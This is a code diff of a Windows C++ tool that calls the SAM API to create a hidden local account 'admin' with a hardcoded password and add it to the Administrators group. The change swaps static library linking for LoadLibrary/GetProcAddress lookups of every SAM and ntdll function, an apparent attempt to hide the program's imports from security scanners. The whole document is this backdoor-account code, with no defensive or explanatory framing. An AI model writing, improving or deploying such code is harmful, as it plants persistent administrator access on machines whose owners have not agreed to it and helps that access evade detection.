@@ -2,14 +2,22 @@
 #include <windows.h>
 #include "samlib.h"
 
-#pragma comment(lib, "samlib.lib")
-#pragma comment(lib, "ntdll.lib")
-
 #define want_user L"admin"
 #define want_password L"zxczxczxc"
 
-
-
+decltype(&RtlInitUnicodeString) pRtlInitUnicodeString;
+decltype(&RtlEqualUnicodeString) pRtlEqualUnicodeString;
+decltype(&SamConnect)
+    pSamConnect;
+decltype(&SamEnumerateDomainsInSamServer) pSamEnumerateDomainsInSamServer;
+decltype(&SamLookupDomainInSamServer) pSamLookupDomainInSamServer;
+decltype(&SamOpenDomain) pSamOpenDomain;
+decltype(&SamCreateUser2InDomain) pSamCreateUser2InDomain;
+decltype(&SamSetInformationUser) pSamSetInformationUser;
+decltype(&SamLookupNamesInDomain) pSamLookupNamesInDomain;
+decltype(&SamOpenAlias) pSamOpenAlias;
+decltype(&SamRidToSid) pSamRidToSid;
+decltype(&SamAddMemberToAlias) pSamAddMemberToAlias;
 
 NTSTATUS status = STATUS_INVALID_ACCOUNT_NAME, enumDomainStatus;
 
@@ -31,12 +39,20 @@ int main()
 	UNICODE_STRING user;
 	UNICODE_STRING sBuiltin;
 
-	RtlInitUnicodeString(&serverName, L"localhost");
-	RtlInitUnicodeString(&sBuiltin, L"Builtin");
+	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
+        GetProcAddress(hNtdll, "RtlInitUnicodeString");
+        pRtlInitUnicodeString = (decltype(&RtlInitUnicodeString))GetProcAddress(
+            hNtdll, "RtlInitUnicodeString");
+        pRtlEqualUnicodeString =
+            (decltype(&RtlEqualUnicodeString))GetProcAddress(
+                hNtdll, "RtlEqualUnicodeString");
+
+	pRtlInitUnicodeString(&serverName, L"localhost");
+	pRtlInitUnicodeString(&sBuiltin, L"Builtin");
 
 	// 配置计划任务
-    RtlInitUnicodeString(&password, want_password);
-    RtlInitUnicodeString(&user, want_user);
+        pRtlInitUnicodeString(&password, want_password);
+        pRtlInitUnicodeString(&user, want_user);
 	
 	
 	int i;
@@ -57,22 +73,57 @@ int main()
 	PSID userSID = NULL;
 	SAMPR_USER_ALL_INFORMATION userAllInfo = { 0 };
 
-	status = SamConnect(&serverName, &hServer, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
+	HMODULE hSamsrv = LoadLibraryA("samlib.dll");
+        pSamConnect =
+            (decltype(&SamConnect))GetProcAddress(hSamsrv, "SamConnect");
+        pSamEnumerateDomainsInSamServer =
+            (decltype(&SamEnumerateDomainsInSamServer))GetProcAddress(
+                hSamsrv, "SamEnumerateDomainsInSamServer");
+        pSamLookupDomainInSamServer =
+            (decltype(&SamLookupDomainInSamServer))GetProcAddress(
+                hSamsrv, "SamLookupDomainInSamServer");
+        pSamOpenDomain =
+            (decltype(&SamOpenDomain))GetProcAddress(hSamsrv, "SamOpenDomain");
+        pSamCreateUser2InDomain =
+            (decltype(&SamCreateUser2InDomain))GetProcAddress(
+                hSamsrv, "SamCreateUser2InDomain");
+        pSamSetInformationUser =
+            (decltype(&SamSetInformationUser))GetProcAddress(
+                hSamsrv, "SamSetInformationUser");
+        pSamLookupNamesInDomain =
+            (decltype(&SamLookupNamesInDomain))GetProcAddress(
+                hSamsrv, "SamLookupNamesInDomain");
+        pSamOpenAlias =
+            (decltype(&SamOpenAlias))GetProcAddress(hSamsrv, "SamOpenAlias");
+        pSamRidToSid =
+            (decltype(&SamRidToSid))GetProcAddress(hSamsrv, "SamRidToSid");
+        pSamAddMemberToAlias = (decltype(&SamAddMemberToAlias))GetProcAddress(
+            hSamsrv, "SamAddMemberToAlias");
+
+	status = pSamConnect(&serverName, &hServer,
+                             SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS |
+                                 SAM_SERVER_LOOKUP_DOMAIN,
+                             FALSE);
 	if (NT_SUCCESS(status))
 	{
 		do
 		{
-			enumDomainStatus = SamEnumerateDomainsInSamServer(hServer, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountReturned);
+            enumDomainStatus = pSamEnumerateDomainsInSamServer(
+                hServer, &domainEnumerationContext, &pEnumDomainBuffer, 1,
+                &domainCountReturned);
 			for (i = 0; i < domainCountReturned; i++)
 			{
-				if (RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &sBuiltin, TRUE)) {
-					status = SamLookupDomainInSamServer(hServer, &pEnumDomainBuffer[i].Name, &BuiltSID);
+				if (pRtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &sBuiltin, TRUE)) {
+                            status = pSamLookupDomainInSamServer(
+                                hServer, &pEnumDomainBuffer[i].Name, &BuiltSID);
 					if (NT_SUCCESS(status)) {
 						wprintf(L"[+] SamLookupDomainInSamServer Built \n");
 					}
 				}
 				else {
-					status = SamLookupDomainInSamServer(hServer, &pEnumDomainBuffer[i].Name, &AccountSID);
+                                  status = pSamLookupDomainInSamServer(
+                                      hServer, &pEnumDomainBuffer[i].Name,
+                                      &AccountSID);
 					if (NT_SUCCESS(status)) {
 						wprintf(L"[+] SamLookupDomainInSamServer Account \n");
 					}
@@ -80,10 +131,15 @@ int main()
 			}
 		} while (enumDomainStatus == STATUS_MORE_ENTRIES);
 
-		status = SamOpenDomain(hServer, DOMAIN_LOOKUP | DOMAIN_CREATE_USER, AccountSID, &hDomainHandle);
+		status =
+                    pSamOpenDomain(hServer, DOMAIN_LOOKUP | DOMAIN_CREATE_USER,
+                                   AccountSID, &hDomainHandle);
 		if (NT_SUCCESS(status))
 		{
-			status = SamCreateUser2InDomain(hDomainHandle, &user, USER_NORMAL_ACCOUNT, USER_ALL_ACCESS | DELETE | WRITE_DAC, &hUserHandle, &grantAccess, &relativeId);
+                  status = pSamCreateUser2InDomain(
+                      hDomainHandle, &user, USER_NORMAL_ACCOUNT,
+                      USER_ALL_ACCESS | DELETE | WRITE_DAC, &hUserHandle,
+                      &grantAccess, &relativeId);
 			if (NT_SUCCESS(status))
 			{
 
@@ -95,9 +151,9 @@ int main()
 				userAllInfo.UserAccountControl &= 0xFFFFFFFE;
 				userAllInfo.UserAccountControl |= USER_NORMAL_ACCOUNT;
 				userAllInfo.WhichFields |= USER_ALL_USERACCOUNTCONTROL;
-				RtlInitUnicodeString(&userAllInfo.NtOwfPassword, password.Buffer);
+				pRtlInitUnicodeString(&userAllInfo.NtOwfPassword, password.Buffer);
 
-				status = SamSetInformationUser(
+				status = pSamSetInformationUser(
                                     hUserHandle, UserAllInformation,
                                     (SAMPR_USER_INFO_BUFFER*)&userAllInfo);
 				if (NT_SUCCESS(status))
@@ -111,25 +167,27 @@ int main()
 		}
 		else wprintf(L"[!] SamOpenDomain error. 0x%ld\n", status);
 
-		status = SamOpenDomain(hServer, DOMAIN_LOOKUP, BuiltSID, &hDomainHandle);
+		status = pSamOpenDomain(hServer, DOMAIN_LOOKUP, BuiltSID, &hDomainHandle);
 		if (NT_SUCCESS(status))
 		{
-			RtlInitUnicodeString(&adminGroup, L"administrators");
+			pRtlInitUnicodeString(&adminGroup, L"administrators");
 
 			// Lookup Administrators in Builtin Domain
-                        status = SamLookupNamesInDomain(hDomainHandle, 1,
+                        status = pSamLookupNamesInDomain(hDomainHandle, 1,
                                                         &adminGroup, &adminRID,
                                                         (PDWORD*)&user);
 			if (NT_SUCCESS(status))
 			{
 
-				status = SamOpenAlias(hDomainHandle, ALIAS_ADD_MEMBER, *adminRID, &hAdminGroup);
+				status = pSamOpenAlias(hDomainHandle, ALIAS_ADD_MEMBER, *adminRID, &hAdminGroup);
 				if (NT_SUCCESS(status))
 				{
-					SamRidToSid(hUserHandle, relativeId, &userSID);
+                                  pSamRidToSid(hUserHandle, relativeId,
+                                               &userSID);
 
 					// Add user to Administrators
-					status = SamAddMemberToAlias(hAdminGroup, userSID);
+                                  status = pSamAddMemberToAlias(hAdminGroup,
+                                                                userSID);
 					if (NT_SUCCESS(status))
 					{
 						wprintf(L"[+] SamAddMemberToAlias success.\n");
